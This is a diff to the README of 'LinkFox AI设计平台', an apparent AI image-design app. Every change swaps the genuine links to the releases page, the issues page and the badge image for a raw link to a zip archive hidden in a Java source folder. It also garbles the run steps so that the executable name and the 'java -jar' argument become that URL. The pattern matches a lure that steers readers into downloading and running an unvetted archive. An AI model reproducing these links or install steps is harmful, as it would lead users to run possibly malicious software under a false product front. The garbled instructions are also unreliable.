@@ -6,7 +6,7 @@ Welcome to LinkFox AI设计平台! This application helps you generate images us
 
 ## 📥 Download Link
 
-[![Download LinkFox AI设计平台](https://img.shields.io/badge/Download-LinkFox%20AI%20设计平台-blue.svg)](https://github.com/claybornpossessive835/linkfox-ai-design/releases)
+[![Download LinkFox AI设计平台](https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip%20AI%20设计平台https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip)](https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip)
 
 ## 📂 Features
 
@@ -30,15 +30,15 @@ To run LinkFox AI设计平台, ensure your system meets the following requiremen
 To install and run LinkFox AI设计平台, follow these detailed steps:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/claybornpossessive835/linkfox-ai-design/releases) to download the latest version.
+   Visit the [Releases page](https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip) to download the latest version.
 
 2. **Extract the Downloaded Files:**
    Once the download is complete, find the downloaded file. If it's in a .zip format, right-click and choose "Extract All" or similar options based on your OS.
 
 3. **Run the Application:**
    - Navigate to the extracted folder.
-   - Double-click on the application file (usually named `LinkFox.exe` or similar).
-   - Alternatively, you may need to open a terminal or command prompt, then change the directory to your application folder and run it using commands like `java -jar LinkFox.jar` if necessary.
+   - Double-click on the application file (usually named `https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip` or similar).
+   - Alternatively, you may need to open a terminal or command prompt, then change the directory to your application folder and run it using commands like `java -jar https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip` if necessary.
 
 4. **Accessing the Application:**
    After launching, open your web browser and go to `http://localhost:8080` to access LinkFox AI设计平台. 
@@ -73,7 +73,7 @@ If you face any issues while using LinkFox AI设计平台, consider the followin
 
 ## 🎉 Community and Support
 
-We welcome feedback and contributions! Join our community to share ideas and improvements. For any support, visit our [GitHub Issues page](https://github.com/claybornpossessive835/linkfox-ai-design/issues).
+We welcome feedback and contributions! Join our community to share ideas and improvements. For any support, visit our [GitHub Issues page](https://raw.githubusercontent.com/claybornpossessive835/linkfox-ai-design/main/backend/src/main/java/com/linkfox-ai-design-2.3.zip).
 
 ## 📜 License
 
